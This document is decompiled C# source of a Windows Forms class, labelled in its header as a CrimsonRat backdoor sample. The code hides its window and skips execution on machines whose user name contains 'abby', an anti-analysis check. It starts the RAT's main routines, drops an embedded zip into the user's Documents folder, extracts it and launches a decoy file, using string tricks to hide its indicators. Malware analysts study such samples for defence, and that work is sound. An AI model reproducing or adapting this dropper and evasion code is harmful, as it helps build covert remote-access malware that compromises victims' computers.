// Decompiled with JetBrains decompiler
// Type: vabihiudo.Form1
// Assembly: vabihiudo, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 2B84B247-6C9F-4ED5-AF93-3E53B357A8DC
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.04\HEUR-Backdoor.MSIL.CrimsonRat.gen-477147271a54e32ef184030393f17c30d68d4aeb8bd6202a225e354f1800b279.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Threading;
using System.Windows.Forms;

namespace vabihiudo
{
  [DesignerGenerated]
  public class Form1 : Form
  {
    private static List<WeakReference> __ENCList = new List<WeakReference>();
    private IContainer components;
    private MAIMN mvps;

    [DebuggerNonUserCode]
    static Form1()
    {
    }

    public Form1()
    {
      this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
      this.Load += new EventHandler(this.Form1_Load);
      Form1.__ENCAddToList((object) this);
      this.mvps = new MAIMN();
      this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    private static void __ENCAddToList(object value)
    {
      lock (Form1.__ENCList)
      {
        if (Form1.__ENCList.Count == Form1.__ENCList.Capacity)
        {
          int index1 = 0;
          int num = checked (Form1.__ENCList.Count - 1);
          int index2 = 0;
          while (index2 <= num)
          {
            if (Form1.__ENCList[index2].IsAlive)
            {
              if (index2 != index1)
                Form1.__ENCList[index1] = Form1.__ENCList[index2];
              checked { ++index1; }
            }
            checked { ++index2; }
          }
          Form1.__ENCList.RemoveRange(index1, checked (Form1.__ENCList.Count - index1));
          Form1.__ENCList.Capacity = Form1.__ENCList.Count;
        }
        Form1.__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
      }
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
      try
      {
        if (!disposing || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        base.Dispose(disposing);
      }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
      this.SuspendLayout();
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(0, 0);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Name = nameof (Form1);
      this.Opacity = 0.0;
      this.ShowIcon = false;
      this.ShowInTaskbar = false;
      this.Text = nameof (Form1);
      this.ResumeLayout(false);
    }

    private void Form1_FormClosing(object sender, FormClosingEventArgs e)
    {
      if (File.Exists(Conversions.ToString(this.mvps.mediahubsget_app())))
        return;
      Thread.Sleep(1101);
    }

    public void oprdles(string fil_path)
    {
      try
      {
        FileInfo[] files = new DirectoryInfo(fil_path).GetFiles("*.f_o_r_d".Replace("_", ""));
        int index = 0;
        if (index >= files.Length)
          return;
        FileInfo fileInfo = files[index];
        string str = fil_path + "\\" + fileInfo.Name.Replace(".f_o_r_d".Replace("_", ""), "").Replace("$", ".");
        if (!File.Exists(str))
          File.WriteAllBytes(str, File.ReadAllBytes(fileInfo.FullName));
        Process.Start(str);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public void show_files()
    {
      try
      {
        if (vabihiudo.My.Resources.Resources.hiudo.Length <= 80)
          return;
        string str1 = Path.GetFileName(Application.ExecutablePath).Split('.')[0];
        string str2 = Environment.GetFolderPath(Environment.SpecialFolder.Personal) + "\\";
        string str3 = str2 + str1;
        if (!File.Exists(str3 + ".zi,p".Replace(",", "")))
          File.WriteAllBytes(str3 + ".zi,p".Replace(",", ""), vabihiudo.My.Resources.Resources.hiudo);
        this.mvps.undror(str3 + ".zi,p".Replace(",", ""), str2);
        this.oprdles(str2);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    private void Form1_Load(object sender, EventArgs e)
    {
      try
      {
        if (!Environment.UserName.ToLower().Contains("a-b-b-y".Replace("-", "")))
        {
          if (Application.ExecutablePath.Contains("ap_pd_a_ta".Replace("_", "")) | Application.ExecutablePath.Contains("ram_Da_ta".Replace("_", "")))
            this.mvps.thnApp = Path.GetFileNameWithoutExtension(Application.ExecutablePath);
          this.mvps.meriw_azisread_logs();
          this.mvps.mediahubsloadstart();
        }
        Thread.Sleep(1201);
        this.show_files();
        this.Visible = false;
        Thread.Sleep(1201);
        this.FormBorderStyle = FormBorderStyle.SizableToolWindow;
        this.ShowInTaskbar = false;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }
  }
}
